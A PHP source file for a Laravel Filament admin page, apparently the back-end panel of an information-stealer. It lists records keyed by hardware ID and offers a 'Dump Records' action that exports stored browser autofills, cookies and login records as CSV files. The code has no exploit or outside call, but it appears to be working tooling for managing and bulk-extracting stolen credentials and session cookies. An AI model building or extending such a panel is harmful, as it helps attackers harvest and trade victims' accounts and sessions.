<?php

namespace App\Filament\Resources\HwidResource\Pages;

use App\Filament\Resources\HwidResource;
use Filament\Pages\Actions;
use Filament\Pages\Actions\Action;
use Filament\Resources\Pages\ListRecords;
use Filament\Forms\Components\Wizard;
use Filament\Forms\Components\Select;
use Filament\Forms\Components\TextInput;
use App\Models\UserProfile;
use App\Models\Autofill;
use App\Models\Cookie;
use App\Models\LoginRecord;
use Illuminate\Support\Arr;
use Maatwebsite\Excel\Facades\Excel;
use App\Exports\AutofillsExport;
use App\Exports\CookiesExport;
use App\Exports\LoginRecordsExport;

class ListHwids extends ListRecords
{
    protected static string $resource = HwidResource::class;

    public function dump(array $data) {
        $limit = Arr::has($data, 'count') ? $data['count'] : 0;
        $from = $data['from'];

        if($from == 'autofills') {
            return Excel::download(new AutofillsExport(empty($limit) ? 0 : $limit), 'autofills.csv');
        }

        if($from == 'cookies') {
            return Excel::download(new CookiesExport(empty($limit) ? 0 : $limit), 'cookies.csv');
        }

        if($from == 'logins') {
            return Excel::download(new LoginRecordsExport(empty($limit) ? 0 : $limit), 'logins.csv');
        }
    }

    protected function getActions(): array
    {
        return [
            //Actions\CreateAction::make(),
            Action::make('Dump Records')
                ->action('dump')
                ->form([
                    Wizard::make([
                        Wizard\Step::make('Options')
                            ->schema([
                                Select::make('from')->options([
                                    //'mixed' => 'mixed',
                                    'autofills' => 'autofills',
                                    'cookies' => 'cookies',
                                    'logins' => 'logins'
                                ])->required(),
                                TextInput::make('count')->numeric()->hint('Skip if you want dump all')
                            ]),
                    ])
                ])
        ];
    }
}
